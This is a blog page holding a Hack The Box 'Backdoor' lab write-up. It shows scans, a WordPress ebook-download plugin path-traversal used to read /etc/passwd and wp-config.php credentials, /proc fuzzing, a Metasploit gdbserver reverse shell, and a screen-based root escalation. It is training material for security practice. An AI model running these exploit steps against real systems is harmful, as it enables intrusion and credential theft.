<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Backdoor | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Backdoor - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-05-htb-backdoor-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-05-htb-backdoor-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-195170229-1","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Backdoor"><meta property="og:description" content="HTB - Backdoor - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-05-htb-backdoor-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-05T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-05T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Backdoor"><meta name=twitter:description content="HTB - Backdoor - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Backdoor","item":"https://cadil.github.io/posts/2024-03-05-htb-backdoor-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Backdoor","name":"HTB - Backdoor","description":"HTB - Backdoor - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.125 2. Nmap nmap -p 1-2000 -sV -sC -oA nmap/backdoor_with_port 10.10.11.125 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 02:43 EST Nmap scan report for 10.10.11.125 Host is up (0.24s latency). Not shown: 1997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor \u0026#8211; Real-Life 1337/tcp open waste? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 72.85 seconds 22,80,1337?\nnmap -vvv -p 1337 -A -v -sC -sV -oN intial.nmap 10.10.11.125 # Nmap 7.91 scan initiated Thu Feb 24 02:54:28 2022 as: nmap -vvv -p 1337 -A -v -sC -sV -oN intial.nmap 10.10.11.125 Nmap scan report for 10.10.11.125 Host is up, received syn-ack (0.24s latency). Scanned at 2022-02-24 02:54:29 EST for 23s PORT STATE SERVICE REASON VERSION 1337/tcp open waste? syn-ack Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 24 02:54:52 2022 -- 1 IP address (1 host up) scanned in 23.49 seconds 3. Gobuster gobuster dir -u http://10.10.11.125 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.125 [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/24 02:31:56 Starting gobuster in directory enumeration mode =============================================================== /wp-content (Status: 301) [Size: 317] [--\u003e http://10.10.11.125/wp-content/] /wp-includes (Status: 301) [Size: 318] [--\u003e http://10.10.11.125/wp-includes/] /wp-admin (Status: 301) [Size: 315] [--\u003e http://10.10.11.125/wp-admin/] Progress: 25236 / 220561 (11.44%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/02/24 02:42:04 Finished ============================================================== /wp-includes,/wp-content 4. Exploitation http://backdoor.htb/wp-content/plugins/ http://backdoor.htb/wp-content/plugins/ebook-download/\n=== Plugin Name === Contributors: zedna Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations\u0026business=3ZVGZTC7ZPCH2\u0026lc=CZ\u0026item_name=Zedna%20Brickick%20Website\u0026currency_code=USD\u0026bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted Tags: ebook, file, download Requires at least: 3.0.4 Tested up to: 4.4 Stable tag: 1.1 License: GPLv2 or later License URI: http://www.gnu.org/licenses/gpl-2.0.htm Stable tag: 1.1\nCurl\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd \u003e passwd.txt passwd.txt:\n/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin user:x:1000:1000:user:/home/user:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false \u003cscript\u003ewindow.close()\u003c/script\u003e curl\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php \u003e wp-config.php wp-config.php:\n../../../wp-config.php../../../wp-config.php../../../wp-config.php\u003c?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the installation. * You don't have to use the web site, you can copy this file to \"wp-config.php\" * and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'wordpressuser' ); /** MySQL database password */ define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' ); /** The database collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' ); /**#@+ * Authentication unique keys and salts. * * Change these to different unique phrases! You can generate these using * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}. * * You can change these at any point in time to invalidate all existing cookies. * This will force all users to have to log in again. * * @since 2.6.0 */ /* That's all, stop editing! Happy blogging. */ /** Absolute path to the WordPress directory. */ if ( !defined('ABSPATH') ) define('ABSPATH', dirname(__FILE__) . '/'); /* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */ $currenthost = \"http://\".$_SERVER['HTTP_HOST']; $currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME'])); $currentpath = preg_replace('/\\/wp.+/','',$currentpath); define('WP_HOME',$currenthost.$currentpath); define('WP_SITEURL',$currenthost.$currentpath); define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content'); define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins'); define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath ); @define('ADMIN_COOKIE_PATH', './'); define( 'AUTH_KEY', 'put your unique phrase here' ); define( 'SECURE_AUTH_KEY', 'put your unique phrase here' ); define( 'LOGGED_IN_KEY', 'put your unique phrase here' ); define( 'NONCE_KEY', 'put your unique phrase here' ); define( 'AUTH_SALT', 'put your unique phrase here' ); define( 'SECURE_AUTH_SALT', 'put your unique phrase here' ); define( 'LOGGED_IN_SALT', 'put your unique phrase here' ); define( 'NONCE_SALT', 'put your unique phrase here' ); /**#@-*/ /** * WordPress database table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */ $table_prefix = 'wp_'; /** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the documentation. * * @link https://wordpress.org/support/article/debugging-in-wordpress/ */ define( 'WP_DEBUG', false ); /* Add any custom values between this line and the \"stop editing\" line. */ /* That's all, stop editing! Happy publishing. */ /** Absolute path to the WordPress directory. */ if ( ! defined( 'ABSPATH' ) ) { define( 'ABSPATH', __DIR__ . '/' ); } /** Sets up WordPress vars and included files. */ require_once ABSPATH . 'wp-settings.php'; \u003cscript\u003ewindow.close()\u003c/script\u003e wfuzz:\nwfuzz -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000840: 200 0 L 12 W 183 Ch \"840\" 000000842: 200 0 L 11 W 181 Ch \"842\" 000000836: 200 0 L 3 W 128 Ch \"836\" 000000852: 200 0 L 8 W 138 Ch \"852\" Total time: 0 Processed Requests: 1000 Filtered Requests: 996 Requests/sec.: 0 curl 840\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/840/cmdline \u003e 840.txt 842\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/842/cmdline \u003e 842.txt 836\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/836/cmdline \u003e 836.txt 852\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline \u003e 852.txt #840 /proc/840/cmdline/proc/840/cmdline/proc/840/cmdline/bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done #842 /proc/842/cmdline/proc/842/cmdline/proc/842/cmdline/bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done #836 /proc/836/cmdline/proc/836/cmdline/proc/836/cmdline/sbin/agetty-o-p -- \\u--nocleartty1linux #852 /proc/852/cmdline/proc/852/cmdline/proc/852/cmdlinesshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups gdbserver\nsudo msfdb run msf6 \u003e use exploit/multi/gdb/gdb_server_exec [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp # Options set payload linux/x64/meterpreter/reverse_tcp set RHOSTS 10.10.11.125 set RPORT 1337 set lhost tun0 run [*] Started reverse TCP handler on 10.10.14.25:4444 [*] 10.10.11.125:1337 - Performing handshake with gdbserver... [*] 10.10.11.125:1337 - Stepping program to find PC... [*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103... [*] 10.10.11.125:1337 - Executing the payload... [*] Sending stage (3012548 bytes) to 10.10.11.125 [*] Meterpreter session 1 opened (10.10.14.25:4444 -\u003e 10.10.11.125:47602) at 2022-02-24 03:30:28 -05 4.1 shell balance shell which python python3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm user.txt:\nf2a0d92************ 5. Enumeration linpeas\ncurl 10.10.14.25:8000/linpeas.sh -o linpeas.sh ## chmod +x linpeas.sh ╔═══════════════════╗ ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════ ╚═══════════════════╝ ╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found -rwsr-xr-- 1 root messagebus 51K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 23K May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 ^[[1;5D-rwsr-xr-x 1 root root 463K Jul 23 2021 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 67K Jul 14 2021 /usr/bin/passwd ---\u003e Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solar is_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 84K Jul 14 2021 /usr/bin/chfn ---\u003e SuSE_9.3/10 -rwsr-xr-x 1 root root 87K Jul 14 2021 /usr/bin/gpasswd -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at ---\u003e RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 67K Jul 21 2020 /usr/bin/su -rwsr-xr-x 1 root root 163K Jan 19 2021 /usr/bin/sudo ---\u003e check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 44K Jul 14 2021 /usr/bin/newgrp ---\u003e HP-UX_10.20 -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 464K Feb 23 2021 /usr/bin/screen ---\u003e GNU_Screen_4.5.0 -rwsr-xr-x 1 root root 39K Jul 21 2020 /usr/bin/umount ---\u003e BSD/Linux(08-1996) -rwsr-xr-x 1 root root 55K Jul 21 2020 /usr/bin/mount ---\u003e Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 52K Jul 14 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 31K May 26 2021 /usr/bin/pkexec ---\u003e Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) screen -x root/root root:\nid uid=0(root) gid=0(root) groups=0(root) root.txt\ndb4c739****** ","wordCount":"1347","inLanguage":"mn","datePublished":"2024-03-05T00:00:00Z","dateModified":"2024-03-05T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-05-htb-backdoor-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Архив><span>Архив</span></a></li><li><a href=https://cadil.github.io/search/ title=Хайлт><span>Хайлт</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Backdoor</h1><div class=post-description>HTB - Backdoor - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-05 00:00:00 +0000 UTC'>гуравдугаар сар 5, 2024</span>&nbsp;·&nbsp;7 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-exploitation aria-label="4. Exploitation">4. Exploitation</a><ul><li><a href=#41-shell-balance aria-label="4.1 shell balance">4.1 shell balance</a></li></ul></li><li><a href=#5-enumeration aria-label="5. Enumeration">5. Enumeration</a></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.125
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -p 1-2000 -sV -sC -oA nmap/backdoor_with_port 10.10.11.125
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-24 02:43 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.125
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>1997</span> closed ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-generator: WordPress 5.8.1
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Backdoor &amp;<span style=color:#75715e>#8211; Real-Life</span>
</span></span><span style=display:flex><span>1337/tcp open  waste?
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 72.85 seconds
</span></span></code></pre></div><p><code>22</code>,<code>80</code>,<code>1337?</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -vvv -p <span style=color:#ae81ff>1337</span> -A -v -sC -sV -oN intial.nmap 10.10.11.125
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.91 scan initiated Thu Feb 24 02:54:28 2022 as: nmap -vvv -p 1337 -A -v -sC -sV -oN intial.nmap 10.10.11.125</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.125
</span></span><span style=display:flex><span>Host is up, received syn-ack <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Scanned at 2022-02-24 02:54:29 EST <span style=color:#66d9ef>for</span> 23s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE REASON  VERSION
</span></span><span style=display:flex><span>1337/tcp open  waste?  syn-ack
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Thu Feb 24 02:54:52 2022 -- 1 IP address (1 host up) scanned in 23.49 seconds</span>
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://10.10.11.125 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.11.125
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/02/24 02:31:56 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/wp-content           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 317<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.125/wp-content/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-includes          <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 318<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.125/wp-includes/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-admin             <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 315<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.125/wp-admin/<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>25236</span> / <span style=color:#ae81ff>220561</span> <span style=color:#f92672>(</span>11.44%<span style=color:#f92672>)</span>                                                    ^C
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Keyboard interrupt detected, terminating.
</span></span><span style=display:flex><span>                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/02/24 02:42:04 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>==============================================================</span>
</span></span></code></pre></div><p><code>/wp-includes</code>,<code>/wp-content</code></p><h3 id=4-exploitation>4. Exploitation<a hidden class=anchor aria-hidden=true href=#4-exploitation>#</a></h3><figure><img loading=lazy src=/images/backdoor_post_image_1.png></figure><p><code>http://backdoor.htb/wp-content/plugins/</code><figure><img loading=lazy src=/images/backdoor_post_image_2.png></figure></p><p><code>http://backdoor.htb/wp-content/plugins/ebook-download/</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>=== Plugin Name ===
</span></span><span style=display:flex><span>Contributors: zedna
